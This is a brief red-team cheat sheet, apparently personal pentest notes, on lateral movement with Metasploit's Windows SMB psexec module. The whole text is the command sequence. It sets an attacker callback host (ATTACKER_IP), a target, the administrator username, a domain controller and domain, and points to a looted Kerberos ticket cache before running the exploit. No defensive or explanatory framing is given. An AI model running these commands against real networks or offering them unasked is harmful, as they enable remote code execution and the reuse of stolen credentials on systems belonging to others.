# Metasploit - Lateral Movement

### 1) PsExec

    use exploit/windows/smb/psexec

Kerberos Auth

    set lhost ATTACKER_IP
    set rhosts TARGET_IP
    set username administrator
    set smb::auth Kerberos
    set domaincontrollerhost DC_IP
    set smbdomain domain.local
    set smb::rhostname dc01.domain.local
    set smb::krb5ccname /root/.msf4/loot/DATE_default_IP_mit-kerberos.cca_NUM.bin
    run

